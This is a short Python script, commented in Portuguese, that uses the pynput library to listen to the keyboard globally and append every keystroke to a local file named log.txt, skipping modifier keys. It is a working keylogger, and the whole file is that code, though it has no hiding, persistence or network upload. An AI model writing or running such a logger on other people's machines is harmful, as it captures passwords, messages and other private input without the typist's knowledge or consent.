#imports
from pynput import keyboard as kb

#teclas para serem ignoradas
IGNORAR = {
    kb.Key.shift,
    kb.Key.shift_r,
    kb.Key.ctrl_l,
    kb.Key.ctrl_r,
    kb.Key.alt_l,
    kb.Key.alt_r,
    kb.Key.caps_lock,
    kb.Key.cmd
}

def on_press(key):
    try:
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)
    
    except AttributeError:
         with open("log.txt", "a", encoding="utf-8") as f:
            if key == kb.Key.space:
                f.write(" ")
            elif key == kb.Key.enter:
                f.write("\n")
            elif key == kb.Key.tab:
                f.write("\t")
            elif key == kb.Key.backspace:
                f.write(" ")
            elif key == kb.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORAR:
                pass
            else:
                f.write(f"[{key}] ")
with kb.Listener(on_press=on_press) as listener:
    listener.join()